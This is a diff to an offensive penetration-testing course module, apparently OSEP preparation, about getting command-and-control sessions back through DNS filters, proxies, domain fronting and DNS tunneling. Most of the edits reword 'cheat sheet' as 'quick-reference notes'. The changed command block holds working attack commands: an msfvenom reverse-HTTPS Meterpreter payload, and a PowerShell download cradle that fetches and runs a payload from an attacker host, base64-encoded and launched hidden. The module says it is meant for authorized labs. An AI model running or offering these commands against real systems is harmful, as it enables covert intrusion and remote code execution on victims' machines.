@@ -6,6 +6,8 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
 
 > **Covers scenarios:** 17, 28, 29, 30, 31, 32, 33
 >
+> **Course mapping:** Chapter 14 (§14.1 DNS Filters, §14.2 Web Proxies, §14.3–14.5 IDS/IPS & HTTPS Inspection, §14.6 Domain Fronting, §14.7 DNS Tunneling with dnscat2), Chapters 4/7/9 (staged vs. embedded payloads); Challenge 1, Challenge 2
+>
 > **Prerequisites:** attacker box (Kali) + one entry session; HTTPS needs a self-signed certificate (generation in [00-environment-and-infra](/modules/00-environment-and-infra) §3); a DNS channel needs a domain whose NS records point at you, or lab-allowed direct UDP 53 to the attacker; domain fronting needs a CDN or a self-built nginx front-end that can forward by custom Host header.
 
 **Core idea**: this module solves "code runs, but the session / stage 2 never comes back". Every approach hangs off one **proven reachable path**: verify the path first (delivery, proxy, DNS resolution, TLS handshake), then run every stage over that same path. Changing address, port, protocol or proxy context at any stage is just scenario 30 again.
@@ -293,7 +295,7 @@ End Sub
  *      DotNetToJScript.exe serializes a C# assembly into a complete runner.js (hundreds of lines of base64),
  *      this file is used to: (a) record the standard generation command; (b) run a host bitness/.NET preflight before delivery;
  *      (c) when manual assembly is needed, paste the entire tool output into the "paste area" below.
- * Scenario: 9, 10 (cheat sheet JScript > Meterpreter Loader with DotNetToJScript)
+ * Scenario: 9, 10 (quick-reference notes JScript > Meterpreter Loader with DotNetToJScript)
  * Dependencies: Windows tooling host + DotNetToJScript.exe; target WSH + .NET (v4 or v2).
  * Usage:
  *  1) generate the complete artifact (it runs standalone, this file is not needed):
@@ -1663,15 +1665,17 @@ curl -k https://FRONT/ -H "Host: BACKEND" --resolve FRONT:443:FRONT_IP -o PAYLOA
 
 ---
 
-## Module cheat sheet
+## Module quick-reference notes
 
 ```bash
 # embedded payload (scenario 17)
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f ps1
 
-# encode a PowerShell command (scenario 17/28/31; cheat sheet: Encode PowerShell Payloads)
-echo -en 'iex((New-Object Net.WebClient).DownloadString("http://LHOST/PAYLOAD"))' | iconv -t UTF-16LE | base64 -w 0
-powershell -nop -w hidden -enc <BASE64>
+# encode a PowerShell command (scenario 17/28/31; quick-reference notes: Encode PowerShell Payloads)
+PS_CMD='iex((New-Object Net.WebClient).DownloadString("http://LHOST/PAYLOAD"))'
+B64=$(printf '%s' "$PS_CMD" | iconv -t UTF-16LE | base64 -w 0)
+# run it on the target (quote the blob; an unquoted <BASE64> is a shell redirection error)
+powershell -nop -w hidden -enc "$B64"
 
 # view/set proxy (scenario 28/29)
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
